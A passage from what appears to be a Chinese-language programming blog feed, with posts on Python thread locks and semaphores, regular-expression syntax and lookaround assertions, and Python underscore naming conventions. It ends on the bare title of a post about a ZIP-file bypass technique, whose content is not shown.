lockA&#x27;</span>)<br>    lockB.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lockB&#x27;</span>)<br>    lockA.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lockA&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    foo()<br>    bar()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    t = threading.Thread(target=run, args=())<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="递归锁（可重入锁）"><a href="#递归锁（可重入锁）" class="headerlink" title="递归锁（可重入锁）"></a>递归锁（可重入锁）</h3><p>递归锁（Recursive Mutex）可以被获取多次，并且只能被所有者释放，用于解决多个互斥锁死锁情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>rlock = threading.RLock()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lock-1&#x27;</span>)<br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lock-1&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lock-1&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 等待io操作</span><br>    rlock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lock-2&#x27;</span>)<br>    rlock.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar release lock-1&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    foo()<br>    bar()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    t = threading.Thread(target=run, args=())<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>信号量（Semaphore），用于多线程同步，限制线程的并发量。</p><blockquote><p>mutex是semaphore的一种特殊情况（n=1时）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>sem = threading.Semaphore(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 每2秒打印5次线程名称</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    sem.acquire()<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(threading.current_thread().name)<br>    sem.release()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    <span class="hljs-keyword">with</span> sem:  <span class="hljs-comment"># 使用with语句</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span>(threading.current_thread().name)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t = threading.Thread(target=foo, args=[])<br>    t.start()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>多线程</tag>
      
      <tag>GIL</tag>
      
      <tag>锁机制</tag>
      
      <tag>高并发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/post/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/post/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>正则表达式（Regular Expression，常简写为regex、regexp或re），是一种简练地描绘一组字符的方式，可用于高效、精确地执行字符串检索、替换等任务。</p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th>语法</th><th>描述</th><th>语法</th><th>描述</th><th>语法</th><th>描述</th><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>[abc]</td><td>单个字符：a或b或c</td><td>[^abc]</td><td>a/b/c以外的单个字符</td><td>[a-zA-Z0-9]</td><td>范围内的字符</td><td>.</td><td>任意字符（除\n）</td></tr><tr><td>\s</td><td>空白符（等价于[ \f\n\r\t\v]）</td><td>\S</td><td>非空白符</td><td>\d</td><td>数字字符（十进制）</td><td>\D</td><td>非数字字符</td></tr><tr><td>\w</td><td>单词（字母，数字，下划线，中文）</td><td>\W</td><td>非单词</td><td>\b</td><td>单词边界</td><td>\B</td><td>非单词边界</td></tr><tr><td>^ \A</td><td>开头</td><td>$ \Z</td><td>结尾</td><td>(…)</td><td>分组</td><td>(a|b)</td><td>择一匹配：a或b</td></tr><tr><td>a*</td><td>重复0次或多次</td><td>a+</td><td>重复1次或多次</td><td>a?</td><td>重复0次或1次</td><td>a{n}</td><td>重复n次</td></tr><tr><td>a{n,}</td><td>重复n次或多次</td><td>a{n,m}</td><td>重复n到m次</td><td>?</td><td>非贪婪匹配</td><td>(?:abc)</td><td>非捕获分组</td></tr><tr><td>(?=abc)</td><td>正向匹配abc</td><td>(?!abc)</td><td>正向不匹配abc</td><td>\xhh</td><td>十六进制hh字符</td><td>\uhhhh</td><td>十六进制hhhh字符</td></tr><tr><td>\u{hhhh}</td><td>十六进制hhhh字符（设置u标志）</td><td>(?#comment)</td><td>注释</td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><ul><li>i - IgnoreCase：不区分大小写</li><li>m - MultiLine：多行匹配</li><li>s - DotAll：<code>.</code>匹配所有字符（包括<code>\n</code>）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不区分大小写</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>))  <span class="hljs-comment"># None</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, re.I))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 1), match=&#x27;A&#x27;&gt;</span><br><span class="hljs-comment"># 多行匹配</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;^test-\w*&#x27;</span>, <span class="hljs-string">&#x27;test-google\ntest-baidu\ntest-weibo&#x27;</span>))  <span class="hljs-comment"># [&#x27;test-google&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;^test-\w*&#x27;</span>, <span class="hljs-string">&#x27;test-google\ntest-baidu\ntest-weibo&#x27;</span>, re.M))  <span class="hljs-comment"># [&#x27;test-google&#x27;, &#x27;test-baidu&#x27;, &#x27;test-weibo&#x27;]</span><br><span class="hljs-comment"># 更改.含义</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;.*&#x27;</span>, <span class="hljs-string">&#x27;a\nb\nc&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 1), match=&#x27;a&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;.*&#x27;</span>, <span class="hljs-string">&#x27;a\nb\nc&#x27;</span>, re.S))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;a\nb\nc&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><p>当正则表达式中包含限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符（主动回溯），这被称为<strong>贪婪匹配</strong>；相反的是，在表达式能得到匹配的前提下匹配尽可能少的字符，这就是<strong>懒惰匹配</strong>。在使用上，只需在限定符后添加<code>?</code>，就可以将贪婪限定符转换为惰性限定符。</p><blockquote><p>限定符：限定前面的表达式出现的次数。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 贪婪匹配</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;$&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;aaaaa&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;aaaaa&#x27;&gt;</span><br><span class="hljs-comment"># 懒惰匹配</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;?$&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 5), match=&#x27;aaaaa&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(re.match(<span class="hljs-string">r&#x27;^a&#123;2,5&#125;?&#x27;</span>, <span class="hljs-string">&#x27;aaaaa&#x27;</span>))  <span class="hljs-comment"># &lt;re.Match object; span=(0, 2), match=&#x27;aa&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="分组和后向引用"><a href="#分组和后向引用" class="headerlink" title="分组和后向引用"></a>分组和后向引用</h2><h3 id="捕获分组"><a href="#捕获分组" class="headerlink" title="捕获分组"></a>捕获分组</h3><p>(exp) ：匹配表达式exp，并捕获文本到自动命名的组里。</p><p>(?P<name>exp) ：匹配表达式exp，并捕获文本到名称为name的组里。</p><blockquote><p>在使用小括号进行分组后，每个分组会自动拥有一个组号。组号分配会从左向右扫描两遍：先给未命名组分配，第一个出现的分组组号默认为1，第二个为2，以此类推，之后给命名组分配分组名称。分组0代表全局分组，对应着整个正则表达式匹配的结果。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">it = re.finditer(<span class="hljs-string">r&#x27;age:(?P&lt;agegroup&gt;\d+),name:(\w+)&#x27;</span>, <span class="hljs-string">&#x27;age:13,name:Tom;age:18,name:John&#x27;</span>)<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> it:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(m.group())  <span class="hljs-comment"># 输出捕获到的所有内容</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">0</span>))  <span class="hljs-comment"># 同m.group()</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">1</span>))  <span class="hljs-comment"># 输出age分组</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-string">&#x27;agegroup&#x27;</span>))  <span class="hljs-comment"># 同m.group(1)</span><br>    <span class="hljs-built_in">print</span>(m.group(<span class="hljs-number">2</span>))  <span class="hljs-comment"># 输出name分组</span><br></code></pre></td></tr></table></figure><h3 id="非捕获分组"><a href="#非捕获分组" class="headerlink" title="非捕获分组"></a>非捕获分组</h3><p>(?:exp)：匹配表达式exp，不捕获匹配的文本，也不给此分组分配组号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不忽略分组</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;age:(\d+),name:(\w+)&#x27;</span>, <span class="hljs-string">&#x27;age:13,name:Tom;age:18,name:John&#x27;</span>))  <span class="hljs-comment"># [(&#x27;13&#x27;, &#x27;Tom&#x27;), (&#x27;18&#x27;, &#x27;John&#x27;)]</span><br><span class="hljs-comment"># 忽略分组</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;age:(?:\d+),name:(\w+)&#x27;</span>, <span class="hljs-string">&#x27;age:13,name:Tom;age:18,name:John&#x27;</span>))  <span class="hljs-comment"># [&#x27;Tom&#x27;, &#x27;John&#x27;]</span><br></code></pre></td></tr></table></figure><h3 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h3><p>所谓后向引用，就是在后式中对前面出现过的分组再一次引用，可用于重复搜索前面某个分组匹配的文本。</p><ul><li>通过索引引用： <code>\1</code>表示引用第一个分组，<code>\2</code>表示引用第二个分组，以此类推，<code>\n</code>表示引用第n个分组。</li><li>通过命名分组名引用：命名 (?P<name>exp)，引用 (?P=name) 。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例1：匹配字符串中连续出现的两个相同单词</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b(\w+)\b\s+\1\b&#x27;</span>, <span class="hljs-string">&#x27;this is a test to match: Go Go home home&#x27;</span>))  <span class="hljs-comment"># [&#x27;Go&#x27;, &#x27;home&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b(?P&lt;testgroup&gt;\w+)\b\s+(?P=testgroup)\b&#x27;</span>, <span class="hljs-string">&#x27;this is a test to match: Go Go home home&#x27;</span>))  <span class="hljs-comment"># [&#x27;Go&#x27;, &#x27;home&#x27;]</span><br><br><span class="hljs-comment"># 示例2：字符串从后往前每隔3个字符插入一个&#x27;,&#x27;符号</span><br>s = <span class="hljs-string">&#x27;12345678900&#x27;</span><br>s = s[::-<span class="hljs-number">1</span>]<br>s = re.sub(<span class="hljs-string">r&#x27;(...)&#x27;</span>, <span class="hljs-string">r&#x27;\1,&#x27;</span>, s)<br><span class="hljs-built_in">print</span>(s[::-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 12,345,678,900</span><br></code></pre></td></tr></table></figure><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>断言用来声明一个应该为真的事实，正则表达式中只有当断言为真时才会继续进行匹配。零宽断言是一种零宽度的匹配，它匹配到的内容不会保存到匹配结果中，最终匹配结果只是一个<strong>位置</strong>。</p><p>零宽断言用于查找在某些内容（但并不包括这些内容）之前或者之后的东西，这个位置应该满足一定的条件（即断言）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 零宽度正预测先行断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;, &#x27;watch&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watch&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watching1&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b.+(?=ing\b)&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading and watch&#x27;]</span><br><span class="hljs-comment"># 零宽度正回顾后发断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread)\w+\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread)\w+\b&#x27;</span>, <span class="hljs-string">&#x27;reading1 and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing1&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread)\w+\b&#x27;</span>, <span class="hljs-string">&#x27;reading1 and reading2&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing1&#x27;, &#x27;ing2&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;(?&lt;=\bread).+\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;ing and watching&#x27;]</span><br><span class="hljs-comment"># 零宽度负预测先行断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;read and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;read&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading1 and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading1&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+d(?!ing)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading1 and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\b\w+(?!ing\b)\w*&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading&#x27;, &#x27;and&#x27;, &#x27;watching&#x27;] ？？</span><br><span class="hljs-comment"># 零宽度负回顾后发断言</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;eading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;eading&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;1reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;1reading&#x27;, &#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!rea)d\w*\b&#x27;</span>, <span class="hljs-string">&#x27;1reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;and&#x27;]</span><br><span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">r&#x27;\w+(?&lt;!\brea)\w*\b&#x27;</span>, <span class="hljs-string">&#x27;reading and watching&#x27;</span>))  <span class="hljs-comment"># [&#x27;reading&#x27;, &#x27;and&#x27;, &#x27;watching&#x27;] ？？</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 下划线含义</title>
    <link href="/post/Python%E4%B8%8B%E5%88%92%E7%BA%BF%E5%90%AB%E4%B9%89/"/>
    <url>/post/Python%E4%B8%8B%E5%88%92%E7%BA%BF%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了 Python 中单下划线和双下划线的各种含义及命名约定。</p><h2 id="单前导下划线"><a href="#单前导下划线" class="headerlink" title="单前导下划线"></a>单前导下划线</h2><p>示例：<code>_var</code></p><p>单下划线开头的命名方式常在模块中使用，有一个约定俗成的含义，表示希望这个变量或方法仅供 <strong>内部使用</strong>，是对开发者的一种提示。在类中使用时表示 <strong>受保护成员</strong>，意思是只有类对象和子类对象能访问到这些数据。在实际使用中不能用 <code>from module import *</code> 导入，但允许使用 <code>from module import xxx</code> 导入。</p><h2 id="单末尾下划线"><a href="#单末尾下划线" class="headerlink" title="单末尾下划线"></a>单末尾下划线</h2><p>示例：<code>var_</code></p><p>单下划线结尾的命名方式也存在，但是不常用，其实也不推荐用。这种命名方式的作用就是为了和 Python 的一些内置关键词区分开来，假设我们想给一个变量命名为 <em>class</em>，但是这会跟 Python 的关键词 <em>class</em> 冲突，所以我们只好退一步使用单下划线结尾命名，也就是 *class_*。</p><h2 id="双前导下划线"><a href="#双前导下划线" class="headerlink" title="双前导下划线"></a>双前导下划线</h2><p>示例：<code>__var</code></p><p>双下划线开头的命名方式有更为实际的作用，表示类的 <strong>私有成员</strong>，只允许类本身访问，连子类对象也不能访问到这些数据，也无法直接通过 <code>对象名.成员名</code> 这样的方式访问。双下划线前缀会导致 Python 解释器重写属性名称，以避免子类中的命名冲突，这种行为也叫做 <strong>名称修饰（name mangling）</strong>。</p><blockquote><p>可以使用内置的 <code>dir()</code> 方法查看对象属性。</p></blockquote><h2 id="双前导双末尾下划线"><a href="#双前导双末尾下划线" class="headerlink" title="双前导双末尾下划线"></a>双前导双末尾下划线</h2><p>示例：<code>__var__</code></p><p>以双下划线开头和结尾的是 Python 中的 “魔术” 对象，是特殊方法专用的标识，如类成员的 <code>__init__</code>、<code>__del__</code>、<code>__add__</code>、<code>__getitem__</code> 等，以及全局的 <code>__file__</code>、<code>__name__</code> 等。需要注意的是，如果一个名字同时以双下划线开头和结尾，则不会应用名称修饰，即被双下划线前缀和后缀包围的变量不会被 Python 解释器修改。</p><p>Python 官方推荐 <strong>永远不要</strong> 将这样的命名方式应用于自己的变量或方法，而是按照文档说明来使用，以避免与将来的 Python 语言产生冲突。</p><h2 id="单下划线"><a href="#单下划线" class="headerlink" title="单下划线"></a>单下划线</h2><p>示例：<code>_</code></p><p>按照习惯，有时候单个的独立下划线可以用作一个名字，来表示某个变量是 <strong>临时的</strong> 或 <strong>无关紧要的</strong>。例如，在下面的循环中，我们不需要访问正在运行的索引，那么可以使用 <code>_</code> 来表示它只是一个临时值：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br><span class="hljs-meta">... </span>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, World.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>除了用作临时变量之外，<code>_</code> 是大多数 Python REPL（交互窗口）中的一个特殊变量，表示由解释器评估的最近一个表达式的结果，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">2</span> + <span class="hljs-number">3</span><br><span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>_<br><span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><table><thead><tr><th>模式</th><th>举例</th><th>含义</th></tr></thead><tbody><tr><td>单前导下划线</td><td><code>_var</code></td><td>命名约定，表示希望变量或方法仅供内部使用。</td></tr><tr><td>单末尾下划线</td><td><code>var_</code></td><td>命名约定，用于避免和 Python 的一些内置关键词冲突。</td></tr><tr><td>双前导下划线</td><td><code>__var</code></td><td>在类中使用时会触发名称修饰，类似于 Python 的 “私有变量”。</td></tr><tr><td>双前导双末尾下划线</td><td><code>__var__</code></td><td>Python 语言定义的 “魔术” 对象，应该避免使用这种命名方式。</td></tr><tr><td>单下划线</td><td><code>_</code></td><td>作为临时的或无关紧要的变量的名称。</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>命名规范</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Double Loaded ZIP File 绕过手法</title>
    <link href="/post/Double%20Loaded%20ZIP%20File%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/"/>
    <url>/post/Double%20Loaded%20ZIP%20File%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/</url>
    
